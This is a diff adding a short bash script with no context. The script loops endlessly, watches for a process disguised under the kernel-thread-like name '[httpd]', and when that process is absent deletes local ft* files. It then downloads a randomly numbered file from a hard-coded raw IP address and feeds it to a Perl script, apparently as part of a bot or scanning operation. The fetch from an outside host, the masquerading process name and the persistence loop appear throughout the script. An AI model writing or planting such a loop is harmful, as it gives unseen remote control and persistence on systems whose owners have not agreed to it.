@@ -1,0 +1,28 @@
+#!/bin/bash
+
+i=`ps x |grep -F '[httpd]' |grep -v grep |wc -l`
+
+a=1
+
+while [ $a -lt 2 ] ;do
+
+if [ $i == 0 ] ;then
+
+rm -rf ft*
+
+rand1=`echo "$(( ( RANDOM % 400 )  + 1 ))"`
+
+wget http://138.68.52.55/uploads/logs/ft$rand1
+
+perl s.pl -i ft* -o v.txt
+
+sleep 20
+
+fi
+
+i=`ps x |grep -F '[httpd]' |grep -v grep |wc -l`
+
+let a=a+0
+
+done
+
